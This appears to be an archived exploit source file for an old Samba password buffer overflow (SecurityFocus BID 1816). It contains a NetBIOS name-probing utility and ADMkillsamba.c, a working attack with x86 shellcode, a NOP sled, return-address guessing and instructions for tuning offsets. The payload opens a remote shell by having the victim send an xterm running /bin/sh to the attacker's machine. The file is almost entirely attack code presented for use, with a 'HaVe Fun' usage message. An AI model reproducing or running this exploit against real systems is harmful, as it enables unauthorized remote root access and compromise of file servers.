// source: https://www.securityfocus.com/bid/1816/info

Samba is an open source software suite that provides seamless file and print services to SMB/CIFS clients. Certain older versions of Samba had a remotely exploitable buffer overflow vulnerability. This vulnerability was in the password function of the authentication mechanism which is to say a user could supply an overly long password to the Samba server and trigger a buffer overflow.

*/

/* Note i have include a little utility pinched from ADMtoolz
 for get the netbios name

  --------------------------------------------------------------------------
------------------------------[ADMnmbname.c]----------------------------------
  --------------------------------------------------------------------------  */


#define DEFAULT_OFFSET 3500
#define DEFAULT_BUFFER_SIZE 3081
#define NOP 0x90
#define NMBHDRSIZE 13
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_tcp.h>

struct nmbhdr {
unsigned short int id;

unsigned char  R:1;
unsigned char  opcode:4;
unsigned char  AA:1;
unsigned char  TC:1;
unsigned char  RD:1;
unsigned char  RA:1;
unsigned char  unless:2;
unsigned char  B:1;
unsigned char  RCODE:4;


unsigned short int que_num;
unsigned short int rep_num;
unsigned short int num_rr;
unsigned short int num_rrsup;
unsigned char namelen;
};


struct typez{
u_int type;
u_int type2;
};


unsigned int host2ip(char *serv)
{
struct sockaddr_in sin;
struct hostent *hent;

hent=gethostbyname(serv);
if(hent == NULL) return 0;
bzero((char *)&sin, sizeof(sin));
bcopy(hent->h_addr, (char *)&sin.sin_addr, hent->h_length);
return sin.sin_addr.s_addr;
}



main( int argc, char  **argv)
{
struct sockaddr_in  sin_me , sin_dst;
struct nmbhdr *nmb,*nmb2;
struct iphdr *ipz;
struct typez  *typz;
struct hostent *hent;
int socket_client,sr,num,i=1,bha,timeout=0,try=0,GO=0;
int longueur=sizeof(struct sockaddr_in);
char  *data;
char  *dataz;
char   buffer[1024];
char   buffer2[1024];
char   namezz[1024];
char   name[64]="CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0";
char   c;

if(argc <2) {
        printf("usage: ADMnmbname <ip of the victim>\n");
        exit (0);
        }


socket_client=socket(AF_INET,SOCK_DGRAM,17);
sr=socket(AF_INET,SOCK_RAW,17);
ioctl(sr,FIONBIO,&i);


sin_me.sin_family=AF_INET;
sin_me.sin_addr.s_addr=htonl(INADDR_ANY);
sin_me.sin_port=htons(2600);

sin_dst.sin_family=AF_INET;
sin_dst.sin_port=htons(137);
sin_dst.sin_addr.s_addr = host2ip(argv[1]);

nmb = (struct nmbhdr *)  buffer;
data = (char *)(buffer+NMBHDRSIZE);
typz = (struct typez *)(buffer+NMBHDRSIZE+33);
nmb2 = (struct nmbhdr *)(buffer2+20+8);
ipz   = (struct iphdr *)buffer2;
dataz = (char *)(buffer2+50+7+20+8);

memset(buffer,0,1024);
memset(buffer2,0,1024);
memset(namezz,0,1024);
memcpy(data,name,33);

           /* play with the netbios query format :) */

nmb->id=0x003;
nmb->R=0;                  /* 0 for question 1 for response */
nmb->opcode=0;             /* 0 = query */
nmb->que_num=htons(1);     /* i have only 1 question :) */
nmb->namelen=0x20;
typz->type=0x2100;
typz->type2=0x1000;

sendto(socket_client,buffer,50,0,(struct sockaddr *)&sin_dst,longueur);



  for(timeout=0;timeout<90;timeout++ )
  {
           usleep(100000);
           buffer2[0]='0';
           recvfrom(sr,buffer2,800,0,(struct sockaddr *)&sin_dst,&(int)longueur);

        if(buffer2[0]!='0')
                {



                          if(nmb2->rep_num!=0)
                            {
                            bha=0;

                                     for(;;)
                                     {

                                        c=*(dataz+bha);
                                        if(c!='\x20')
                                                        {

                                                        namezz[bha]=c;
                                                        bha++;
                                                         }
                                        if(c=='\x20')break;
                                   }


                                printf("netbios name of %s is %s\n",argv[1],namezz);
                                try =4;
                                GO = 4;

                                break;
                              }
                }


     }




memset(buffer,0,1024);
memset(buffer2,0,1024);

}

/*
 ---------------------------------------------------------------------------
----------------------------[ADMkillsamba.c]---------------------------------
 ---------------------------------------------------------------------------

         generic buffer overflow ameliored for samba sploit
 the sploit send a xterm to your machine .
 hey dont forget to do a  xhost +IP-OF-VICTIM  !!!!
 and put the the sploit to the same directory of  the special smbclient !

 */


/* diz default offset and buffer size Work fine on a my system Redhat 4.2  with samba server

1.9.17alpha5 < the last version !> i have tested on other system with this deffautl buff & size

smb 1.9.16p[9-11] the default srv on redhat 4.1 4.2  but somtime you need to change the

buffer size and offset   try a buffer of ( 1050<buffer >1100) and a offset ( 1500<off >2500)

mail me at admsmb@hotmail.com if u wanna some help */





#define DEFAULT_OFFSET 3500
#define DEFAULT_BUFFER_SIZE 3081
#define NOP 0x90
#include <stdlib.h>
#include <strings.h>

unsigned char shellcode[500] =

"\xeb\x2f\x5f\xeb\x4a\x5e\x89\xfb\x89\x3e\x89\xf2\xb0\xfe\xae\x74"
"\x14\x46\x46\x46\x46\x4f\x31\xc9\x49\xb0\xff\xf2\xae\x30\xc0\x4f"
"\xaa\x89\x3e\xeb\xe7\x31\xc0\x89\x06\x89\xd1\x31\xd2\xb0\x0b\xcd"
"\x80\xe8\xcc\xff\xff\xff";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  char netbios_name[100];

  char bufferz[255];
  char ipz[40];
  char myipz[40];
  unsigned char bla[50] = "\xfe\xe8\xb1\xff\xff\xff";
  int *ret;
  unsigned char cmd[50]="/usr/bin/X11/xterm\xff-display\xff";
  unsigned char arg1[50];
  char arg2[50]="bhahah\xff";


  int i,pid;

  bzero(netbios_name,100);
  bzero(bufferz,255);
  bzero(ipz,40);
  bzero(ipz,40);

  if(argc <4){
  printf(" usage: ADMkillsamba <ip of the victim> <netbios name> <your ip> [buff size] [offset size]\n");
  printf("<ip of victim> = 11.11.11.11  ! THe numerical IP  Only ! not www.xxx.cc !\n");
  printf("<netbios name> = VICTIME    for get the netbios name use ADMnmbname or ADMhack\n");
  printf("<your ip> = the sploit send a xterm to your machine heh \n");
  printf("option:\n");
  printf("[buff size] = the size of the buffer to send default is 3081 try +1 -1 to a plage of +10 -10\n");
  printf("[offset size] = the size of the offset default is 3500 try +50 -50 to a plage of 1000 -1000\n");
  printf(" HaVe Fun\n");
  exit(0);
  }

    sprintf(arg1,"%s:0\xff-e\xff/bin/sh\xff",argv[3]);

    shellcode[4] =(unsigned char)0x32+strlen(cmd)+strlen(arg1);
    bla[2] =(unsigned char) 0xc9-strlen(cmd)-strlen(arg1);

 printf("4 byte = 0x%x\n",shellcode[4]);
 printf("5 byte = 0x%x\n",bla[2]);

  strcat(shellcode,cmd);
  strcat(shellcode,arg1);
  strcat(shellcode,bla);
  strcat(shellcode,"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");

//  printf("%s\n",shellcode);

  strcpy(ipz,argv[1]);                   /* haha u can overflow my sploit :) */
  strcpy(netbios_name,argv[2]);


  if (argc > 4) bsize  = atoi(argv[4]);
  if (argc > 5) offset = atoi(argv[5]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

sprintf(bufferz,"\\\\\\\\%s\\\\IPC$",netbios_name);


  addr =  0xbffffff0 - offset ;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/4; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/4) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  execl("./smbclient","smbclient",bufferz,buff,"-I",ipz,NULL);



 }